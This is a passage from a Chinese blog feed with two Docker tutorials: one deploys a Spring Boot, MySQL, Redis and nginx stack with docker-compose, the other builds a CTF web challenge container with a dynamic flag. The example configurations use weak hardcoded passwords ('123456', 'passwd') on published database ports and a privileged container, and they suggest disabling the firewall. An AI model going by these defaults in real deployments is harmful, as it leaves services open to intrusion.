flat"><p>这里如果重新修改了后端项目中数据库的ip，且已经创建了后端镜像，请先删除已经创建了的后端镜像（我这里是<code>myweb</code>），不然数据库的ip地址是不会更新的。</p></div><h2 id="五、容器间通信"><a href="#五、容器间通信" class="headerlink" title="五、容器间通信"></a>五、容器间通信</h2><p>Docker容器间通信是很常见的操作，它允许一个容器使用另一个容器提供的服务。</p><p>一般在使用docker-compose启动服务时，被同一个docker-compose.yml定于的服务（容器）会运行在一个隔离环境中，也就是说在这个环境中的容器是不能直接访问（如果没有设置的话）</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">data_security:</span>      <span class="comment"># 自定义网络名字</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">bridge</span> </span><br><span class="line">    <span class="attr">ipam:</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">subnet:</span> <span class="number">10.1</span><span class="number">.0</span><span class="number">.0</span><span class="string">/24</span>       <span class="comment">#自定义固定容器ip 实现容器间通讯，增强docker-compose项目可移植性</span></span><br></pre></td></tr></table></figure><p><code>数据库</code>和<code>springboot项目</code>分别使用<code>不同的docker容器</code>启动，这样会导致项目访问数据库受限，这里将docker-compose内所有服务都设置在同一网段中，可以管理容器及通信问题。 （在其他服务中不要设置IP地址为x.x.x.1，容易报错）</p><p>可以进入创建的docker网络查看一下相关信息👇</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker network ls        # 输出docker网络列表</span><br><span class="line">docker network inspect 网络id# 查看指定网络详情</span><br><span class="line">docker network rm 网络id# 删除指定网络</span><br></pre></td></tr></table></figure><h2 id="六、完整代码"><a href="#六、完整代码" class="headerlink" title="六、完整代码"></a>六、完整代码</h2><p>docker-compose.yml</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span><span class="comment"># 自定义版本号，一般是2，3</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">nginx:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./config/nginx/nginx.conf:/etc/nginx/nginx.conf</span>   <span class="comment"># nginx配置文件</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./config/html/dist/:/usr/share/nginx/html/</span>        <span class="comment"># 前端打包文件</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8080:80&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">data_security:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.128</span><span class="number">.0</span><span class="number">.8</span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">true</span>      <span class="comment"># 这个必须要，解决nginx的文件调用的权限问题</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">mysql:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:8.0.12</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">mysql</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TZ=Asia/Shanghai</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_ROOT_PASSWORD=123456</span>                <span class="comment">#数据库初始话为root用户设置的默认密码</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_DATABASE=xx</span><span class="comment"># 项目数据库名</span></span><br><span class="line">      <span class="comment"># - MYSQL_USER:                           #自定义数据库的用户，权限只作用于MYSQL_DATABASE配置的数据库</span></span><br><span class="line">      <span class="comment"># - MYSQL_PASSWORD:                    #自定义数据库的用户，权限只作用于MYSQL_DATABASE配置的数据库</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="comment"># - ./config/mysql/cnf/my.cnf:/etc/my.cnf</span></span><br><span class="line">      <span class="comment"># - ./config/mysql/data:/var/lib/mysql</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./config/mysql/init/xx.sql:/docker-entrypoint-initdb.d/xx.sql</span><span class="comment"># 自己数据库sql文件</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;3306:3306&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">data_security:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.128</span><span class="number">.0</span><span class="number">.2</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">--default-authentication-plugin=mysql_native_password</span> <span class="string">--character-set-server=utf8mb4</span> <span class="string">--collation-server=utf8mb4_unicode_ci</span> <span class="string">--sql-mode=&#x27;&#x27;</span> <span class="string">--max-execution-time=1000</span></span><br><span class="line">        </span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">redis</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TZ=Asia/Shanghai</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">REDIS_ROOT_PASSWORD=passwd</span><span class="comment"># redis密码</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./config/redis/conf/redis.conf:/etc/redis/redis.conf</span>   <span class="comment">#挂载redis.conf不然后续重启redis密码会失效</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./config/redis/data:/data</span></span><br><span class="line">      <span class="comment"># - ./config/redis/log/redis.log:/logs/redis.log</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;6379:6379&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">data_security:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.128</span><span class="number">.0</span><span class="number">.3</span></span><br><span class="line">    <span class="comment"># privileged: true</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">redis-server</span> <span class="string">/etc/redis/redis.conf</span> <span class="string">--requirepass</span> <span class="string">passwd</span>          <span class="comment">#指定配置文件启动redis</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">myweb:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">web/test1</span>     <span class="comment"># 镜像名</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span>        <span class="comment"># 表示以当前目录下的Dockerfile开始构建镜像</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8090:8090&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mysql</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">data_security:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.128</span><span class="number">.0</span><span class="number">.4</span></span><br><span class="line">    </span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">data_security:</span>      <span class="comment"># 自定义网络名字</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">bridge</span> </span><br><span class="line">    <span class="attr">ipam:</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">subnet:</span> <span class="number">192.128</span><span class="number">.0</span><span class="number">.0</span><span class="string">/16</span>           <span class="comment">#自定义固定容器ip 实现容器间通讯，增强docker-compose项目可移植性</span></span><br></pre></td></tr></table></figure><p>在docker-compose.yml文件目录下直接输入第一条命令启动服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up# 开启服务并显示日志</span><br><span class="line">docker-compose up -d        # 后台开启服务</span><br><span class="line">docker logs -f 容器id        # 查看指定已开启容器日志</span><br><span class="line">docker-compose down# 一键关闭所有服务并清除已退出的容器</span><br></pre></td></tr></table></figure><h2 id="七、运行截图"><a href="#七、运行截图" class="headerlink" title="七、运行截图"></a>七、运行截图</h2><p>如图👇，服务启动正常，浏览器输入<code>http://your-ip:8080</code>查看效果，没有效果的查看一下防火墙是否关了。</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220426/运行截图.1kz4bfbtf1z4.jpg" alt="运行截图"></p>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker搭建CTF（Web）环境</title>
      <link href="/posts/f7e6aba0/"/>
      <url>/posts/f7e6aba0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="note info no-icon flat"><p>CTF需要web环境，通过docker可以更好更快地创建一个独立的容器，作为选手的动态靶机。<br>Docker，是具备有简化配置、全平台、提高效率、方便共享、快速部署等特点的。<br>去年学了docker，一直想用它来创建一个本地web环境。<br>正好赶上了出题时机，顺便总结一下近期的docker笔记。</p></div><h2 id="一、Docker基本命令"><a href="#一、Docker基本命令" class="headerlink" title="一、Docker基本命令"></a>一、Docker基本命令</h2><p>纯笔记，其实也已经够用了。 详细资料请移步下方链接🔗</p><ul><li><p><a href="https://dockerdocs.cn/get-started/overview/">docker官方文档</a></p></li><li><p><a href="https://yeasy.gitbook.io/docker_practice/image/commit">Docker — 从入门到实践</a></p></li></ul><h3 id="拉取查看篇"><a href="#拉取查看篇" class="headerlink" title="拉取查看篇"></a>拉取查看篇</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker pull ubuntu:16.04                # 拉取对应镜像</span><br><span class="line"></span><br><span class="line">docker images                # 查看当前系统中存在镜像 </span><br><span class="line"></span><br><span class="line">docker ps                          # 查看运行中的容器</span><br><span class="line">docker ps -a                       # 查看所有容器（包括已结束运行的）</span><br><span class="line"></span><br><span class="line">docker cp 主机文件名 容器id:容器指定目录  # 将主机文件复制到指定位置，反之则交换位置</span><br></pre></td></tr></table></figure><h3 id="运行篇"><a href="#运行篇" class="headerlink" title="运行篇"></a>运行篇</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -it 容器id      # 以交互模式运行容器，为容器重新分配一个伪输入终端</span><br><span class="line">docker run -d 容器id      # 后台运行容器，并返回容器ID</span><br></pre></td></tr></table></figure><div class="hide-toggle" style="border: 1px solid #e8fafe"><div class="hide-button toggle-title" style="background-color: #e8fafe;color: color"><i class="fas fa-caret-right fa-fw"></i><span>docker run命令详情</span></div>    <div class="hide-content"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br></pre></td></tr></table></figure><p>OPTIONS说明：</p><ul><li><strong>-a stdin:</strong> 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项；</li><li><strong>-d:</strong> 后台运行容器，并返回容器ID；</li><li><strong>-i:</strong> 以交互模式运行容器，通常与 -t 同时使用；</li><li><strong>-P:</strong> 随机端口映射，容器内部端口<strong>随机</strong>映射到主机的端口</li><li><strong>-p:</strong> 指定端口映射，格式为：主机(宿主)端口:容器端口</li><li><strong>-t:</strong> 为容器重新分配一个伪输入终端，通常与 -i 同时使用；</li><li><strong>—name=”nginx-lb”:</strong> 为容器指定一个名称；</li><li><strong>—dns 8.8.8.8:</strong> 指定容器使用的DNS服务器，默认和宿主一致；</li><li><strong>—dns-search example.com:</strong> 指定容器DNS搜索域名，默认和宿主一致；</li><li><strong>-h “mars”:</strong> 指定容器的hostname；</li><li><strong>-e username=”ritchie”:</strong> 设置环境变量；</li><li><strong>—env-file=[]:</strong> 从指定文件读入环境变量；</li><li><strong>—cpuset=”0-2” or —cpuset=”0,1,2”:</strong> 绑定容器到指定CPU运行；</li><li><strong>-m</strong> :设置容器使用内存最大值；</li><li><strong>—net=”bridge”:</strong> 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型；</li><li><strong>—link=[]:</strong> 添加链接到另一个容器；</li><li><strong>—expose=[]:</strong> 开放一个端口或一组端口；</li><li><strong>—volume , -v:</strong>     绑定一个卷</li></ul></div></div><h3 id="停止删除篇"><a href="#停止删除篇" class="headerlink" title="停止删除篇"></a>停止删除篇</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker stop 容器id             #停止指定容器</span><br><span class="line">docker stop $(docker ps -a -q)      #停止所有已经运行的容器</span><br><span class="line"></span><br><span class="line">docker rm 容器id               #删除指定容器，删除前先停止</span><br><span class="line">docker rm $(docker ps -a -q)        #删除所有已经停止的指令</span><br><span class="line"></span><br><span class="line">docker rmi 镜像id    # 删除指定镜像</span><br></pre></td></tr></table></figure><h3 id="进入退出容器篇"><a href="#进入退出容器篇" class="headerlink" title="进入退出容器篇"></a>进入退出容器篇</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 容器id  /bin/bash  # 进入容器的bash界面</span><br><span class="line">docker attach 容器id# 进入容器内部</span><br><span class="line">exit                                    # 进入docker内部后退出容器</span><br></pre></td></tr></table></figure><p>之前的<code>docker exec -it ID /bin/bash</code>其实并没有进入这个容器，而是弹了一个<code>bash</code>出来让我们能在容器里操作，而<code>attach</code>才算进入了容器内部。</p><h3 id="查看相关配置"><a href="#查看相关配置" class="headerlink" title="查看相关配置"></a>查看相关配置</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker port 容器id   # 查看容器映射端口</span><br><span class="line">netstat -tlnp# 查看主机开放端口</span><br><span class="line">systemctl status firewalld# 查看防火墙状态</span><br><span class="line">systemctl stop firewalld# 暂时关闭防火墙</span><br></pre></td></tr></table></figure><h3 id="导出导入篇"><a href="#导出导入篇" class="headerlink" title="导出导入篇"></a>导出导入篇</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker export 容器id &gt; ctf.tar# 导出为tar文件</span><br><span class="line">docker save 镜像name  &gt; ./ctf.tar# 将→指定镜像名←保存成 tar 归档文件</span><br><span class="line">cat ctf.tar | docker import - ctf               # 可以这样导入</span><br><span class="line">docker load&lt;ctf.tar        # 载入镜像包</span><br></pre></td></tr></table></figure><div class="note primary no-icon flat"><p>小Tip：</p><ul><li><p>docker save 保存的是镜像（image），docker export 保存的是容器（container）；</p></li><li><p>docker load 用来载入镜像包，docker import 用来载入容器包，但两者都会恢复为镜像；</p></li><li><p>docker load 不能对载入的镜像重命名，而 docker import 可以为镜像指定新名称。</p></li></ul></div><p>若导入时出现这个问题<code>open /var/lib/docker/tmp/docker-import-970689518/bin/json: no such file or directory</code>，说明这个tar包缺少docker所需要的一些json文件，不能直接导入。</p><h2 id="二、文件目录总览"><a href="#二、文件目录总览" class="headerlink" title="二、文件目录总览"></a>二、文件目录总览</h2><p>目录文件夹如下:<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220404/目录文件夹.72tihoys43c0.jpg" alt="文件目录总览"></p><h2 id="三、Dockerfile"><a href="#三、Dockerfile" class="headerlink" title="三、Dockerfile"></a>三、Dockerfile</h2><p>Dockerfile 是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明。</p><p>👉 <a href="https://www.runoob.com/docker/docker-dockerfile.html">Dockerfile相关指令教程</a> 👈</p><p><strong>文件名：Dockerfile</strong><br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">16.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> Author=<span class="string">&quot;Ztop&quot;</span></span></span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> Blog=<span class="string">&quot;https://www.zeker.top&quot;</span></span></span><br><span class="line"><span class="keyword">ENV</span> REFRESHED_AT <span class="number">2022</span>-<span class="number">03</span>-<span class="number">01</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先写 修改源/更新 【如果必须的话】</span></span><br><span class="line"><span class="comment"># 替换源（这里可用sed或者直接COPY一个完整的sources.list来替换）</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> sed -i s@/deb.debian.org/@/mirrors.aliyun.com/@g /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="bash">    sed -i s@/security.debian.org/@/mirrors.aliyun.com/@g /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apt-get update -y</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#防止Apache安装过程中地区的设置出错</span></span><br><span class="line"><span class="keyword">ENV</span> DEBIAN_FRONTEND noninteractive</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装apache2</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get install apache2 -y</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#安装php</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get install php -y</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get install libapache2-mod-php -y  --fix-missing</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get install php7.0-mysql -y</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># #安装mysql</span></span><br><span class="line"><span class="comment"># RUN apt-get install mysql-server -y</span></span><br><span class="line"><span class="comment"># RUN apt-get install mysql-client -y</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后才是复制文件，不推荐挂载卷</span></span><br><span class="line"><span class="comment"># ADD会自动解压压缩包，而COPY不会</span></span><br><span class="line"><span class="comment"># ADD html.tgz /var/www</span></span><br><span class="line"><span class="comment">#将题目源码放进去</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> rm -rf /var/www/html/index.html</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./src/ /var/www/html/   </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /var/www/html/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#启动脚本</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./run.sh /root/run.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash">  chmod +x /root/run.sh</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">&quot;/root/run.sh&quot;</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#设置环境变量</span></span><br><span class="line"><span class="comment">#ENV FLAG=flag&#123;test_flag&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#暴露端口</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br></pre></td></tr></table></figure></p><p>在 Dockerfile 文件的存放目录下，执行构建动作。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker build -t ctf:v1 .            # dockerfile目录下输入构建命令，用来构建基于ubuntu:16.04的自定义镜像。</span><br><span class="line"></span><br><span class="line">docker run -d -p 5555:80 -e FLAG=flag&#123;$(cat /proc/sys/kernel/random/uuid)&#125; 镜像id  # 添加系统uuid作为动态flag字段</span><br><span class="line"></span><br><span class="line">docker ps                           # 查看是否运行</span><br><span class="line"></span><br><span class="line">docker exec -it 容器id /bin/bash     # 进入容器</span><br><span class="line">exit                                 # 在容器内退出</span><br></pre></td></tr></table></figure></p><h2 id="四、Shell文件"><a href="#四、Shell文件" class="headerlink" title="四、Shell文件"></a>四、Shell文件</h2><p><strong>文件名：run.sh</strong><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义动态flag字段</span></span><br><span class="line">uuid=$(cat /proc/sys/kernel/random/uuid)</span><br><span class="line">FLAG=<span class="string">&quot;flag&#123;<span class="variable">$uuid</span>&#125;&quot;</span></span><br><span class="line">sed -i <span class="string">&quot;s/flag_is_here/<span class="variable">$FLAG</span>/&quot;</span> /var/www/html/flag</span><br><span class="line"><span class="comment"># sed -i &quot;s/flag_is_here/$FLAG/&quot; /var/www/html/flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 覆盖掉环境变量，防止非预期</span></span><br><span class="line"><span class="built_in">export</span> FLAG=not_flag</span><br><span class="line">FLAG=not_flag</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动apache</span></span><br><span class="line">service apache2 restart</span><br><span class="line"></span><br><span class="line"><span class="comment"># # never exit，此处是为了运行完上条应用服务后，有对应的前台进程</span></span><br><span class="line">tail -f /dev/null</span><br></pre></td></tr></table></figure><br>附上<code>flag</code>文件中的内容<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_is_here</span><br></pre></td></tr></table></figure></p><div class="note info no-icon flat"><p><code>sed -i</code> 就是直接对文本文件进行操作的<br>替换文件中的原字符串<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#x27;s/原字符串/新字符串/&#x27; /home/1.txt# 替换每一行的第一个匹配项</span><br><span class="line"></span><br><span class="line">sed -i &#x27;s/原字符串/新字符串/g&#x27; /home/1.txt# 替换每一行的所有匹配项</span><br></pre></td></tr></table></figure></p></div><h2 id="五、Docker-compose"><a href="#五、Docker-compose" class="headerlink" title="五、Docker-compose"></a>五、Docker-compose</h2><p><code>Docker-compose</code> 是一个用来把 <code>docker</code> 自动化的东西。<br>有了 <code>docker-compose</code> 你可以把所有繁杂重复的 docker 操作<code>全都一条命令</code>，自动化的完成。</p><p><code>Compose</code> 是用于定义和运行多容器 Docker 应用程序的工具。<br>通过 <code>Compose</code>，你可以使用 <code>YML</code> 文件来配置应用程序需要的所有服务。<br>然后，使用一个命令，就可以从 <code>YML</code> 文件配置中创建并启动所有服务。</p><p><strong>文件名：docker-compose.yml</strong><br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 指定该文件版本</span></span><br><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="comment"># 把每个子目录视为一个镜像，开始构建</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web1:</span></span><br><span class="line">    <span class="comment"># 此处仅允许 image, build, ports，禁止其他字段出现，如果有 volume，cmd 等设置需求，请在 Dockerfile 里进行文件拷贝或者申明。</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">ctf/test1</span>        <span class="comment">#镜像名字</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">./web/</span>           <span class="comment">#build的位置，docker会去web1中的dockerfile开始搭建</span></span><br><span class="line">    <span class="comment"># restart: always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;5555:80&quot;</span>           <span class="comment">#设置映射的断口</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">FLAG=flag&#123;this_is_test_flag&#125;</span>                      <span class="comment"># 这里定义了flag,但是不会覆盖sh里的$FLAG</span></span><br><span class="line">    <span class="comment">#   - FLAG=flag&#123;$(cat /proc/sys/kernel/random/uuid)&#125;  # 获取容器的uuid作为flag 会报错</span></span><br></pre></td></tr></table></figure></p><ul><li>version<br>说明了yml文件指明的版本号，一般我们使用<code>2，3</code>这两个版本。</li><li>services<br>yml文件的主体，定义了服务了配置。里面的<code>web</code>标签是我们自己定义的。<br>build表明了以dockerfile类型启动一个容器，后面跟的是dockerfile的路径，支持相对路径和绝对路径，在这个yml文件里面，表明dockerfile与yml处在同个目录下。</li></ul><div class="note primary no-icon 